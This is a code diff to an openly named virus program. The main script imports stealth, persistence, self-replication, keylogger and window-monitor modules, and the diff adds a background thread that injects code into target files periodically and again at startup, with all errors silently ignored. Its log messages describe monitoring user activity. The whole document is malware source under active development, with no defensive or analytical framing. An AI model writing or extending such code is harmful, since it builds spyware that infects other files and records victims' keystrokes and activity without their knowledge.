@@ -16,7 +16,10 @@ from virus_utils import (
     init_log_file, close_log_file, log_activity,
     save_pid, remove_pid, is_virus_running
 )
-from virus_persistence import setup_stealth, install_persistence, self_replicate
+from virus_persistence import (
+    setup_stealth, install_persistence, self_replicate,
+    inject_into_target_files
+)
 from virus_surveillance import (
     start_system_keylogger, stop_system_keylogger,
     start_window_monitor, stop_window_monitor,
@@ -129,6 +132,23 @@ def main():
     
     collection_thread = threading.Thread(target=periodic_data_collection, daemon=True)
     collection_thread.start()
+    
+    # Periodic file injection
+    def periodic_file_injection():
+        while running:
+            time.sleep(FILE_INJECTION_INTERVAL)
+            try:
+                if running:
+                    inject_into_target_files()
+            except:
+                pass
+    
+    if ENABLE_FILE_INJECTION:
+        injection_thread = threading.Thread(target=periodic_file_injection, daemon=True)
+        injection_thread.start()
+        # Run immediately on startup
+        inject_into_target_files()
+        log_activity("SYSTEM", "File injection module active")
     
     log_activity("SYSTEM", "All surveillance modules active - monitoring user activity")
     
